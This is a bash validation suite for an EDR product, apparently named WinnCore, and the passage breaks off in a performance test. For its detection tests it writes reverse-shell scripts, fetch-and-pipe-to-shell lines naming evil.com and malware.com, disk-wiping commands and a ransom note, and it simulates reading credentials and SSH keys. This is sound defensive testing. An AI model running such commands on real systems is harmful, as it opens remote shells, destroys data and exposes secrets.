#!/usr/bin/env bash
# WinnCore Ultimate EDR Validation Suite
# Safer version (no set -e) to avoid aborting on missing tools/permissions.

set -uo pipefail

VERSION="2.0.0"
SCRIPT_NAME="WinnCore Ultimate Test Suite"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/.." 2>/dev/null && pwd || echo "$SCRIPT_DIR")"
TEST_DIR="/tmp/winncore-ultimate-test-$$"
RESULTS_DIR="$TEST_DIR/results"
ARTIFACTS_DIR="$TEST_DIR/artifacts"
LOGS_DIR="$TEST_DIR/logs"

DAEMON_BIN="$ROOT_DIR/target/release/av-daemon"
CLI_BIN="$ROOT_DIR/target/release/av-cli"

DAEMON_SOCKET="/var/run/winncore/winncore.sock"
ALERT_LOG="/var/log/winncore/alerts.json"
TEST_TIMEOUT=30

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; WHITE='\033[1;37m'; GRAY='\033[0;90m'
NC='\033[0m'; BOLD='\033[1m'

declare -A TEST_RESULTS
TOTAL_TESTS=0; TESTS_PASSED=0; TESTS_FAILED=0; TESTS_SKIPPED=0; TESTS_WARNING=0
declare -A CATEGORY_PASSED CATEGORY_FAILED CATEGORY_TOTAL
START_TIME=$(date +%s)

log() { echo -e "${GRAY}[$(date '+%H:%M:%S')]${NC} $*"; }
info() { echo -e "${BLUE}ℹ${NC} $*"; }
warn() { echo -e "${YELLOW}⚠${NC} $*"; }
error() { echo -e "${RED}✗${NC} $*"; }
success() { echo -e "${GREEN}✓${NC} $*"; }

banner() {
    echo
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${WHITE}${BOLD}$1${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo
}

section() {
    echo
    echo -e "${MAGENTA}┌─────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${MAGENTA}│${NC} ${BOLD}$1${NC}"
    echo -e "${MAGENTA}└─────────────────────────────────────────────────────────────────┘${NC}"
}

subsection() { echo; echo -e "${BLUE}▶ $1${NC}"; }

record_test() {
    local category="$1" name="$2" status="$3" details="${4:-}" duration="${5:-0}"
    ((TOTAL_TESTS++)); ((CATEGORY_TOTAL[$category]=${CATEGORY_TOTAL[$category]:-0}+1))
    case "$status" in
        PASS) ((TESTS_PASSED++)); ((CATEGORY_PASSED[$category]=${CATEGORY_PASSED[$category]:-0}+1)); echo -e "  ${GREEN}✓ PASS${NC} [${duration}ms] $name" ;;
        FAIL) ((TESTS_FAILED++)); ((CATEGORY_FAILED[$category]=${CATEGORY_FAILED[$category]:-0}+1)); echo -e "  ${RED}✗ FAIL${NC} [${duration}ms] $name"; [ -n "$details" ] && echo -e "         ${GRAY}→ $details${NC}" ;;
        SKIP) ((TESTS_SKIPPED++)); echo -e "  ${YELLOW}○ SKIP${NC} $name"; [ -n "$details" ] && echo -e "         ${GRAY}→ $details${NC}" ;;
        WARN) ((TESTS_WARNING++)); echo -e "  ${YELLOW}⚠ WARN${NC} [${duration}ms] $name"; [ -n "$details" ] && echo -e "         ${GRAY}→ $details${NC}" ;;
    esac
    echo "{\"category\":\"$category\",\"name\":\"$name\",\"status\":\"$status\",\"details\":\"$details\",\"duration_ms\":$duration,\"timestamp\":\"$(date -Iseconds)\"}" >> "$RESULTS_DIR/tests.jsonl"
}

time_cmd() { local s=$(date +%s%3N); "$@" >/dev/null 2>&1; local e=$(date +%s%3N); echo $((e - s)); }

is_daemon_running() { pgrep -x av-daemon >/dev/null 2>&1; }

wait_for_alert() {
    local pattern="$1" timeout="${2:-5}" start=$(date +%s)
    while [ $(($(date +%s) - start)) -lt "$timeout" ]; do
        if [ -f "$ALERT_LOG" ] && grep -q "$pattern" "$ALERT_LOG" 2>/dev/null; then return 0; fi
        sleep 0.1
    done
    return 1
}

cleanup() {
    log "Cleaning up test artifacts..."
    pkill -f "winncore-test-" 2>/dev/null || true
    rm -rf "$TEST_DIR" 2>/dev/null || true
    rm -f /tmp/winncore-canary-* 2>/dev/null || true
    rm -f /dev/shm/winncore-test-* 2>/dev/null || true
}
trap cleanup EXIT

setup() {
    banner "$SCRIPT_NAME v$VERSION"
    echo "Configuration:"
    echo "  Root Directory: $ROOT_DIR"
    echo "  Test Directory: $TEST_DIR"
    echo "  Mode: ${MODE:-full}"
    echo "  Date: $(date)"
    echo "  Kernel: $(uname -r)"
    echo "  Arch: $(uname -m)"
    echo

    mkdir -p "$TEST_DIR" "$RESULTS_DIR" "$ARTIFACTS_DIR" "$LOGS_DIR"
    echo '{"suite":"WinnCore Ultimate Test","version":"'$VERSION'","started":"'$(date -Iseconds)'"}' > "$RESULTS_DIR/metadata.json"

    subsection "Prerequisites Check"
    [ -f "$DAEMON_BIN" ] && record_test "setup" "Daemon binary exists" "PASS" || record_test "setup" "Daemon binary exists" "FAIL" "Not found: $DAEMON_BIN"
    [ -f "$CLI_BIN" ] && record_test "setup" "CLI binary exists" "PASS" || record_test "setup" "CLI binary exists" "SKIP" "Not found: $CLI_BIN"
    if is_daemon_running; then DAEMON_RUNNING=true; record_test "setup" "Daemon is running" "PASS"; else DAEMON_RUNNING=false; record_test "setup" "Daemon is running" "SKIP" "Start with: sudo systemctl start winncore"; fi
    if [ "$EUID" -eq 0 ]; then IS_ROOT=true; record_test "setup" "Running as root" "PASS"; else IS_ROOT=false; record_test "setup" "Running as root" "SKIP" "Some tests will be skipped"; fi
}

test_build() {
    section "Phase 1: Build & Binary Verification"
    cd "$ROOT_DIR"
    subsection "Cargo Build"
    local start=$(date +%s%3N)
    if cargo build --release 2>"$LOGS_DIR/build.log"; then
        record_test "build" "Release build succeeds" "PASS" "" "$(($(date +%s%3N) - start))"
    else
        record_test "build" "Release build succeeds" "FAIL" "See $LOGS_DIR/build.log"
    fi

    subsection "Crate Compilation"
    local expected_crates=(av-core av-cli av-daemon av-ml-detector av-quarantine av-signatures av-behavioral av-containers av-memory av-response av-rootkit av-threatintel av-iouring av-ebpf-detect av-fileless av-stack-trace av-deception av-arm64-hw)
    for crate in "${expected_crates[@]}"; do
        if [ -d "$crate" ]; then
            start=$(date +%s%3N)
            if cargo build -p "$crate" --release 2>/dev/null; then
                record_test "build" "Crate: $crate" "PASS" "" "$(($(date +%s%3N) - start))"
            else
                record_test "build" "Crate: $crate" "FAIL" "Compilation error"
            fi
        else
            record_test "build" "Crate: $crate" "SKIP" "Not implemented yet"
        fi
    done

    subsection "Unit Tests"
    start=$(date +%s%3N)
    if cargo test --release 2>"$LOGS_DIR/tests.log"; then
        local duration=$(($(date +%s%3N) - start))
        local test_count=$(grep -c "test .* ok" "$LOGS_DIR/tests.log" 2>/dev/null || echo "0")
        record_test "build" "Unit tests ($test_count tests)" "PASS" "" "$duration"
    else
        record_test "build" "Unit tests" "FAIL" "See $LOGS_DIR/tests.log"
    fi
}

test_hardening() {
    section "Phase 2: Binary Hardening Verification"
    local binary="$DAEMON_BIN"
    [ -f "$binary" ] || { record_test "hardening" "Binary exists" "SKIP" "Daemon not built"; return; }

    subsection "Security Features"
    if file "$binary" | grep -qE "pie executable|shared object"; then record_test "hardening" "PIE (ASLR)" "PASS"; else record_test "hardening" "PIE (ASLR)" "FAIL" "Binary is not position independent"; fi
    if readelf -s "$binary" 2>/dev/null | grep -q "__stack_chk"; then record_test "hardening" "Stack Canaries" "PASS"; else record_test "hardening" "Stack Canaries" "WARN" "Not detected (Rust may use different mechanism)"; fi
    if readelf -l "$binary" 2>/dev/null | grep -q "GNU_RELRO"; then
        if readelf -d "$binary" 2>/dev/null | grep -q "BIND_NOW"; then record_test "hardening" "Full RELRO" "PASS"; else record_test "hardening" "Full RELRO" "WARN" "Partial RELRO only"; fi
    else record_test "hardening" "Full RELRO" "FAIL" "RELRO not enabled"; fi
    if readelf -l "$binary" 2>/dev/null | grep "GNU_STACK" | grep -qv "E"; then record_test "hardening" "NX (Non-executable stack)" "PASS"; else record_test "hardening" "NX (Non-executable stack)" "FAIL" "Executable stack detected"; fi
    if readelf -s "$binary" 2>/dev/null | grep -q "__fortify"; then record_test "hardening" "FORTIFY_SOURCE" "PASS"; else record_test "hardening" "FORTIFY_SOURCE" "SKIP" "Not applicable for Rust"; fi

    if [ "$(uname -m)" = "aarch64" ]; then
        subsection "ARM64 Security Features"
        readelf -n "$binary" 2>/dev/null | grep -q "BTI" && record_test "hardening" "ARM64 BTI" "PASS" || record_test "hardening" "ARM64 BTI" "WARN" "BTI not enabled"
        readelf -n "$binary" 2>/dev/null | grep -q "PAC" && record_test "hardening" "ARM64 PAC" "PASS" || record_test "hardening" "ARM64 PAC" "WARN" "PAC not enabled"
        if grep -q "mte" /proc/cpuinfo 2>/dev/null; then record_test "hardening" "ARM64 MTE (CPU)" "PASS" "Hardware support available"; else record_test "hardening" "ARM64 MTE (CPU)" "SKIP" "CPU does not support MTE"; fi
    fi

    subsection "Binary Analysis"
    local size=$(stat -c%s "$binary" 2>/dev/null || stat -f%z "$binary" 2>/dev/null); local size_mb=$((size / 1024 / 1024))
    [ "$size_mb" -lt 100 ] && record_test "hardening" "Binary size (${size_mb}MB)" "PASS" || record_test "hardening" "Binary size (${size_mb}MB)" "WARN" "Large binary may indicate bloat"
    if file "$binary" | grep -q "not stripped"; then record_test "hardening" "Debug symbols stripped" "WARN" "Binary contains debug symbols"; else record_test "hardening" "Debug symbols stripped" "PASS"; fi
}

test_detection() {
    section "Phase 3: Detection Capability Tests"
    subsection "File-Based Detection"
    local eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    local eicar_file="$ARTIFACTS_DIR/eicar.com"; echo -n "$eicar" > "$eicar_file"
    if [ -f "$CLI_BIN" ]; then
        local start=$(date +%s%3N)
        "$CLI_BIN" scan "$eicar_file" 2>&1 | grep -qi "threat\|malware\|eicar\|detected" && record_test "detection" "EICAR test file" "PASS" "" "$(($(date +%s%3N) - start))" || record_test "detection" "EICAR test file" "WARN" "Detection not confirmed"
    else
        record_test "detection" "EICAR test file" "SKIP" "CLI not available"
    fi

    local suspicious_elf="$ARTIFACTS_DIR/suspicious.elf"
    printf '\x7fELF\x02\x01\x01\x00' > "$suspicious_elf"; echo -e '\x00/bin/sh\x00/etc/shadow\x00nc -e\x00' >> "$suspicious_elf"; chmod +x "$suspicious_elf"
    if [ -f "$CLI_BIN" ]; then
        start=$(date +%s%3N)
        "$CLI_BIN" scan "$suspicious_elf" 2>&1 | grep -qi "suspicious\|threat" && record_test "detection" "Suspicious ELF binary" "PASS" "" "$(($(date +%s%3N) - start))" || record_test "detection" "Suspicious ELF binary" "WARN" "Not flagged as suspicious"
    fi

    local revshell="$ARTIFACTS_DIR/revshell.sh"
    cat > "$revshell" << 'SHELL'
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
SHELL
    chmod +x "$revshell"
    if [ -f "$CLI_BIN" ]; then
        start=$(date +%s%3N)
        "$CLI_BIN" scan "$revshell" 2>&1 | grep -qi "reverse.shell\|suspicious\|threat" && record_test "detection" "Reverse shell script" "PASS" "" "$(($(date +%s%3N) - start))" || record_test "detection" "Reverse shell script" "WARN" "Not detected"
    fi

    local b64_script="$ARTIFACTS_DIR/encoded.sh"
    cat > "$b64_script" << 'ENCODED'
#!/bin/bash
eval $(echo 'aWQ=' | base64 -d)
ENCODED

    local py_revshell="$ARTIFACTS_DIR/revshell.py"
    cat > "$py_revshell" << 'PYTHON'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
PYTHON

    subsection "YARA Signature Detection"
    local yara_test="$ARTIFACTS_DIR/yara_test.bin"
    cat > "$yara_test" << 'YARA_PATTERNS'
This file contains suspicious patterns
/etc/shadow
/etc/passwd
nc -e /bin/sh
wget http://evil.com/malware
curl http://malware.com | sh
rm -rf /
dd if=/dev/zero of=/dev/sda
YARA_PATTERNS
    if [ -f "$CLI_BIN" ]; then
        start=$(date +%s%3N)
        "$CLI_BIN" scan "$yara_test" 2>&1 | grep -qi "yara\|rule\|match" && record_test "detection" "YARA signature match" "PASS" "" "$(($(date +%s%3N) - start))" || record_test "detection" "YARA signature match" "WARN" "No YARA matches reported"
    fi
}

test_mitre_attacks() {
    section "Phase 4: MITRE ATT&CK Attack Simulations"
    subsection "TA0002: Execution"
    local start
    bash -c 'echo "T1059.004 test"' >/dev/null 2>&1
    record_test "mitre" "T1059.004 Unix Shell" "PASS" "Baseline execution"

    info "T1059.004 - Base64 Encoded Command"
    start=$(date +%s%3N); echo 'ZWNobyAidGVzdCI=' | base64 -d | bash >/dev/null 2>&1 || true
    if $DAEMON_RUNNING && wait_for_alert "encoded\|base64\|T1059" 2; then record_test "mitre" "T1059.004 Base64 Encoded" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1059.004 Base64 Encoded" "WARN" "Detection not confirmed"; fi

    info "T1059.006 - Python Execution"
    if command -v python3 &>/dev/null; then
        start=$(date +%s%3N); python3 -c 'import os; os.system("echo test")' >/dev/null 2>&1 || true
        record_test "mitre" "T1059.006 Python" "PASS" "Executed" "$(($(date +%s%3N) - start))"
    else record_test "mitre" "T1059.006 Python" "SKIP" "Python not installed"; fi

    subsection "TA0003: Persistence"
    info "T1053.003 - Cron Job Creation"
    start=$(date +%s%3N); echo "* * * * * echo test" > /tmp/winncore-test-cron-$$
    if $DAEMON_RUNNING && wait_for_alert "cron\|T1053" 2; then record_test "mitre" "T1053.003 Cron Job" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1053.003 Cron Job" "WARN" "Detection not confirmed"; fi
    rm -f /tmp/winncore-test-cron-$$

    info "T1546.004 - Shell Config Modification"
    local bashrc_test="$ARTIFACTS_DIR/bashrc_test"; start=$(date +%s%3N); echo 'echo "persistence test"' > "$bashrc_test"
    if $DAEMON_RUNNING && wait_for_alert "bashrc\|shell.*config\|T1546" 2; then record_test "mitre" "T1546.004 Shell Config" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1546.004 Shell Config" "WARN" "Detection not confirmed"; fi

    subsection "TA0004: Privilege Escalation"
    info "T1548.001 - Setuid Binary Check"; start=$(date +%s%3N); find /usr -perm -4000 -type f 2>/dev/null | head -5 > "$ARTIFACTS_DIR/setuid_bins.txt" || true; record_test "mitre" "T1548.001 Setuid Enumeration" "PASS" "Executed" "$(($(date +%s%3N) - start))"
    info "T1548.003 - Sudo Configuration Check"; start=$(date +%s%3N); sudo -l 2>/dev/null > "$ARTIFACTS_DIR/sudo_privs.txt" || true
    if $DAEMON_RUNNING && wait_for_alert "sudo\|T1548" 2; then record_test "mitre" "T1548.003 Sudo Check" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1548.003 Sudo Check" "WARN" "Detection not confirmed"; fi

    subsection "TA0005: Defense Evasion"
    info "T1070.003 - History Clearing"; start=$(date +%s%3N); history -c 2>/dev/null || true
    if $DAEMON_RUNNING && wait_for_alert "history\|T1070" 2; then record_test "mitre" "T1070.003 History Clear" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1070.003 History Clear" "WARN" "Detection not confirmed"; fi
    info "T1070.004 - Indicator Removal (File Deletion)"; local delete_test="$ARTIFACTS_DIR/to_delete.txt"; echo "test" > "$delete_test"; start=$(date +%s%3N); rm -f "$delete_test"; record_test "mitre" "T1070.004 File Deletion" "PASS" "Executed" "$(($(date +%s%3N) - start))"
    info "T1027 - Obfuscated Files"; local obfuscated="$ARTIFACTS_DIR/obfuscated.sh"; echo 'riny $(rpub "grfg" | ge n-mn-mA-ZN-Z)' > "$obfuscated"
    if $DAEMON_RUNNING && wait_for_alert "obfuscat\|encoded\|T1027" 2; then record_test "mitre" "T1027 Obfuscated Files" "PASS" "Detected"; else record_test "mitre" "T1027 Obfuscated Files" "WARN" "Detection not confirmed"; fi

    info "T1620 - Reflective Code Loading (memfd)"; local memfd_count=$(ls -la /proc/*/exe 2>/dev/null | grep -c memfd || echo "0")
    if [ "$memfd_count" -gt 0 ]; then
        if $DAEMON_RUNNING && wait_for_alert "memfd\|fileless\|T1620" 2; then record_test "mitre" "T1620 Fileless (memfd)" "PASS" "Detected existing memfd processes"; else record_test "mitre" "T1620 Fileless (memfd)" "WARN" "memfd processes exist but not alerted"; fi
    else record_test "mitre" "T1620 Fileless (memfd)" "PASS" "No memfd processes (baseline clean)"; fi

    subsection "TA0006: Credential Access"
    info "T1003.008 - /etc/shadow Access"; start=$(date +%s%3N); cat /etc/shadow >/dev/null 2>&1 || true
    if $DAEMON_RUNNING && wait_for_alert "shadow\|T1003\|credential" 2; then record_test "mitre" "T1003.008 Shadow Access" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1003.008 Shadow Access" "WARN" "Detection not confirmed"; fi
    info "T1552.001 - Credentials in Files"; start=$(date +%s%3N); grep -r "password" /etc 2>/dev/null | head -5 > "$ARTIFACTS_DIR/cred_search.txt" || true
    if $DAEMON_RUNNING && wait_for_alert "credential\|password\|T1552" 2; then record_test "mitre" "T1552.001 Credential Search" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1552.001 Credential Search" "WARN" "Detection not confirmed"; fi
    info "T1552.004 - SSH Key Access"; start=$(date +%s%3N); cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || true
    if $DAEMON_RUNNING && wait_for_alert "ssh.*key\|id_rsa\|T1552" 2; then record_test "mitre" "T1552.004 SSH Key Access" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1552.004 SSH Key Access" "WARN" "Detection not confirmed"; fi

    subsection "TA0007: Discovery"
    info "T1082 - System Information Discovery"; start=$(date +%s%3N); uname -a > "$ARTIFACTS_DIR/sysinfo.txt"; cat /etc/os-release >> "$ARTIFACTS_DIR/sysinfo.txt" 2>/dev/null || true; record_test "mitre" "T1082 System Info" "PASS" "Executed" "$(($(date +%s%3N) - start))"
    info "T1087.001 - Local Account Discovery"; start=$(date +%s%3N); cat /etc/passwd | cut -d: -f1 > "$ARTIFACTS_DIR/users.txt"
    if $DAEMON_RUNNING && wait_for_alert "passwd\|user.*enum\|T1087" 2; then record_test "mitre" "T1087.001 User Enumeration" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1087.001 User Enumeration" "WARN" "Detection not confirmed"; fi
    info "T1046 - Network Service Scanning"
    if command -v nmap &>/dev/null; then start=$(date +%s%3N); nmap -sn 127.0.0.1 >/dev/null 2>&1 || true
        if $DAEMON_RUNNING && wait_for_alert "nmap\|scan\|T1046" 2; then record_test "mitre" "T1046 Network Scan (nmap)" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1046 Network Scan (nmap)" "WARN" "Detection not confirmed"; fi
    else record_test "mitre" "T1046 Network Scan (nmap)" "SKIP" "nmap not installed"; fi
    info "T1049 - System Network Connections Discovery"; start=$(date +%s%3N); ss -tunapl > "$ARTIFACTS_DIR/netstat.txt" 2>/dev/null || netstat -tunapl > "$ARTIFACTS_DIR/netstat.txt" 2>/dev/null || true; record_test "mitre" "T1049 Network Connections" "PASS" "Executed" "$(($(date +%s%3N) - start))"
    info "T1057 - Process Discovery"; start=$(date +%s%3N); ps auxf > "$ARTIFACTS_DIR/processes.txt"; record_test "mitre" "T1057 Process Discovery" "PASS" "Executed" "$(($(date +%s%3N) - start))"

    subsection "TA0008: Lateral Movement"
    info "T1021.004 - SSH Lateral Movement"; which ssh >/dev/null 2>&1 && record_test "mitre" "T1021.004 SSH Available" "PASS" "SSH client present" || record_test "mitre" "T1021.004 SSH Available" "SKIP" "ssh not installed"

    subsection "TA0011: Command and Control"
    info "T1071.001 - Application Layer Protocol (HTTP)"
    if command -v curl &>/dev/null; then start=$(date +%s%3N); curl -s --max-time 2 http://example.com >/dev/null 2>&1 || true; record_test "mitre" "T1071.001 HTTP C2 Pattern" "PASS" "Executed" "$(($(date +%s%3N) - start))"; else record_test "mitre" "T1071.001 HTTP C2 Pattern" "SKIP" "curl not installed"; fi
    info "T1095 - Non-Application Layer Protocol"
    if command -v nc &>/dev/null || command -v ncat &>/dev/null; then start=$(date +%s%3N); nc -h >/dev/null 2>&1 || ncat -h >/dev/null 2>&1 || true
        if $DAEMON_RUNNING && wait_for_alert "netcat\|nc\|T1095" 2; then record_test "mitre" "T1095 Raw Socket Tools" "PASS" "Detected"; else record_test "mitre" "T1095 Raw Socket Tools" "WARN" "Detection not confirmed"; fi
    else record_test "mitre" "T1095 Raw Socket Tools" "SKIP" "netcat not installed"; fi

    subsection "TA0040: Impact"
    info "T1485 - Data Destruction Pattern"; local destruct_test="$ARTIFACTS_DIR/destruct_pattern.sh"; cat > "$destruct_test" << 'DESTRUCT'
#!/bin/bash
# Simulated destruction pattern (doesn't execute)
# rm -rf /
# dd if=/dev/zero of=/dev/sda
DESTRUCT
    if $DAEMON_RUNNING && wait_for_alert "destruct\|wipe\|T1485" 2; then record_test "mitre" "T1485 Data Destruction" "PASS" "Detected"; else record_test "mitre" "T1485 Data Destruction" "WARN" "Detection not confirmed"; fi
    info "T1486 - Data Encrypted for Impact"; local ransom_test="$ARTIFACTS_DIR/ransom_pattern.txt"; cat > "$ransom_test" << 'RANSOM'
Your files have been encrypted!
Send 1 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
RANSOM
    if $DAEMON_RUNNING && wait_for_alert "ransom\|encrypt\|bitcoin\|T1486" 2; then record_test "mitre" "T1486 Ransomware Pattern" "PASS" "Detected"; else record_test "mitre" "T1486 Ransomware Pattern" "WARN" "Detection not confirmed"; fi
}

test_advanced_evasion() {
    section "Phase 5: Advanced Evasion Tests (2024-2025)"

    subsection "io_uring Syscall Bypass"
    if grep -q io_uring /proc/kallsyms 2>/dev/null; then
        local iouring_fds=$(ls -la /proc/*/fd 2>/dev/null | grep -c "io_uring" || echo "0")
        if [ "$iouring_fds" -gt 0 ]; then
            if $DAEMON_RUNNING && wait_for_alert "io_uring\|iouring" 2; then record_test "evasion" "io_uring Monitoring" "PASS" "Detected $iouring_fds rings"; else record_test "evasion" "io_uring Monitoring" "WARN" "Rings present but not alerted"; fi
        else record_test "evasion" "io_uring Monitoring" "PASS" "No io_uring activity (baseline clean)"; fi
    else record_test "evasion" "io_uring Monitoring" "SKIP" "io_uring not available on kernel"; fi

    subsection "eBPF Rootkit Detection"
    if [ -d "/sys/fs/bpf" ]; then
        if command -v bpftool >/dev/null 2>&1; then
            local bpf_progs=$(bpftool prog list 2>/dev/null | wc -l || echo "0")
            if [ "$bpf_progs" -gt 0 ]; then
                if $DAEMON_RUNNING && wait_for_alert "bpf\|ebpf" 2; then record_test "evasion" "eBPF Program Monitoring" "PASS" "Tracking $bpf_progs programs"; else record_test "evasion" "eBPF Program Monitoring" "WARN" "Programs loaded but not tracking"; fi
            else record_test "evasion" "eBPF Program Monitoring" "PASS" "No suspicious BPF programs"; fi
        else record_test "evasion" "eBPF Program Monitoring" "SKIP" "bpftool not installed"; fi
    else record_test "evasion" "eBPF Program Monitoring" "SKIP" "BPF filesystem not mounted"; fi

    subsection "Fileless Execution (memfd_create)"
    local memfd_procs=$(ls -la /proc/*/exe 2>/dev/null | grep -c "memfd:" || echo "0")
    if [ "$memfd_procs" -gt 0 ]; then
        if $DAEMON_RUNNING && wait_for_alert "memfd\|fileless" 2; then record_test "evasion" "memfd_create Detection" "PASS" "Detected $memfd_procs processes"; else record_test "evasion" "memfd_create Detection" "FAIL" "Fileless processes not detected"; fi
    else record_test "evasion" "memfd_create Detection" "PASS" "No fileless processes (baseline clean)"; fi

    subsection "/dev/shm Execution"
    local shm_test="/dev/shm/winncore-test-$$"; echo '#!/bin/sh' > "$shm_test"; echo 'echo test' >> "$shm_test"; chmod +x "$shm_test"
    if $DAEMON_RUNNING && wait_for_alert "shm\|tmpfs.*exec" 2; then record_test "evasion" "/dev/shm Execution" "PASS" "Detected"; else record_test "evasion" "/dev/shm Execution" "WARN" "Not specifically detected"; fi
    rm -f "$shm_test"

    subsection "Process Injection Patterns"
    local ptrace_procs=$(grep -l "TracerPid:[[:space:]]*[1-9]" /proc/*/status 2>/dev/null | wc -l || echo "0")
    if [ "$ptrace_procs" -gt 0 ]; then
        if $DAEMON_RUNNING && wait_for_alert "ptrace\|inject" 2; then record_test "evasion" "Ptrace Detection" "PASS" "Detected"; else record_test "evasion" "Ptrace Detection" "WARN" "Tracing activity not alerted"; fi
    else record_test "evasion" "Ptrace Detection" "PASS" "No active ptrace (baseline clean)"; fi

    subsection "Container Escape Patterns"
    if [ -f "/.dockerenv" ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
        if [ -S "/var/run/docker.sock" ]; then
            if $DAEMON_RUNNING && wait_for_alert "docker.*sock\|container.*escape" 2; then record_test "evasion" "Docker Socket Access" "PASS" "Detected"; else record_test "evasion" "Docker Socket Access" "WARN" "Socket accessible but not alerted"; fi
        else record_test "evasion" "Docker Socket Access" "PASS" "Socket not mounted"; fi
    else record_test "evasion" "Container Environment" "SKIP" "Not running in container"; fi
}

test_deception() {
    section "Phase 6: Deception & Canary Tests"
    subsection "Canary File Access Detection"
    local canary_dir="$ARTIFACTS_DIR/canaries"; mkdir -p "$canary_dir"
    local cred_canary="$canary_dir/passwords.txt"; cat > "$cred_canary" << 'CREDS'
admin:SuperSecret123!
root:toor123
backup:BackupPass456
CREDS
    local ssh_canary="$canary_dir/id_rsa"; cat > "$ssh_canary" << 'SSHKEY'
-----BEGIN OPENSSH PRIVATE KEY-----
CANARY_KEY_NOT_REAL_DO_NOT_USE
-----END OPENSSH PRIVATE KEY-----
SSHKEY
    chmod 600 "$ssh_canary"
    local aws_canary="$canary_dir/credentials"; cat > "$aws_canary" << 'AWSCREDS'
[default]
aws_access_key_id = AKIACANARYNOTREAL123
aws_secret_access_key = canary/secret/key/not/real/testing/only
AWSCREDS

    local start=$(date +%s%3N); cat "$cred_canary" >/dev/null 2>&1 || true
    if $DAEMON_RUNNING && wait_for_alert "canary\|honeypot\|passwords.txt" 2; then record_test "deception" "Credential Canary Access" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "deception" "Credential Canary Access" "WARN" "Access not detected"; fi
    start=$(date +%s%3N); cat "$ssh_canary" >/dev/null 2>&1 || true
    if $DAEMON_RUNNING && wait_for_alert "canary\|honeypot\|id_rsa" 2; then record_test "deception" "SSH Key Canary Access" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "deception" "SSH Key Canary Access" "WARN" "Access not detected"; fi
    start=$(date +%s%3N); cat "$aws_canary" >/dev/null 2>&1 || true
    if $DAEMON_RUNNING && wait_for_alert "canary\|honeypot\|aws\|credential" 2; then record_test "deception" "AWS Canary Access" "PASS" "Detected" "$(($(date +%s%3N) - start))"; else record_test "deception" "AWS Canary Access" "WARN" "Access not detected"; fi
}

test_performance() {
    section "Phase 7: Performance Benchmarks"
    local perf_dir="$TEST_DIR/perf"; mkdir -p "$perf_dir"
    subsection "File Operations Throughput"
    info "File creation throughput (1000 files)..."; local start=$(date +%s%3N)
    for i in $(seq 1 1000); do echo "test content $i" > "$perf_dir/file_$i.txt"; done
    local duration=$(($(date +%s%3N) - start)); local rate=$((1000000 / duration))
    [ "$rate" -gt 500 ] && record_test "performance" "File creation ($rate files/sec)" "PASS" "" "$duration" || record_test "performance" "File creation ($rate files/sec)" "WARN" "Below target (500/sec)" "$duration"

    if [ -f "$CLI_BIN" ]; then
        info "File scanning throughput..."; start=$(date +%s%3N); "$CLI_BIN" scan "$perf_dir" >/dev/null 2>&1 || true
        duration=$(($(date +%s%3N) - start)); rate=$((1000000 / (duration + 1)))
        [ "$rate" -gt 100 ] && record_test "performance" "File scanning ($rate files/sec)" "PASS" "" "$duration" || record_test "performance" "File scanning ($rate files/sec)" "WARN" "Below target (100/sec)" "$duration"
    fi
    rm -rf "$perf_dir"/*

    subsection "Process Monitoring Overhead"
    info "Process spawn baseline..."; start=$(date +%s%3N); for i in $(seq 1 500); do /bin/true; done
    duration=$(($(date +%s%3N) - start)); rate=$((500000 / duration)); record_test "performance" "Process spawn ($rate procs/sec)" "PASS" "" "$duration"

    subsection "Memory Usage"
    if $DAEMON_RUNNING; then
        local daemon_pid=$(pgrep -x av-daemon | head -1)
        if [ -n "$daemon_pid" ]; then
            local rss=$(ps -o rss= -p "$daemon_pid" 2>/dev/null | tr -d ' ' || echo "0"); local rss_mb=$((rss / 1024))
            if [ "$rss_mb" -lt 100 ]; then record_test "performance" "Daemon memory (${rss_mb}MB)" "PASS"; elif [ "$rss_mb" -lt 500 ]; then record_test "performance" "Daemon memory (${rss_mb}MB)" "WARN" "Higher than expected"; else record_test "performance" "Daemon memory (${rss_mb}MB)" "FAIL" "Excessive memory usage"; fi
        fi
    else record_test "performance" "Daemon memory" "SKIP" "Daemon not running"; fi

    subsection "CPU Usage Under Load"
    if $DAEMON_RUNNING; then
        info "Measuring CPU under file operation load..."
        local cpu_before=$(ps -o %cpu= -p "$(pgrep -x av-daemon | head -1)" 2>/dev/null | tr -d ' ' || echo "0")
        mkdir -p "$perf_dir/load"; for i in $(seq 1 500); do echo "load test $RANDOM" > "$perf_dir/load/loadfile_$i.txt"; done; sleep 1
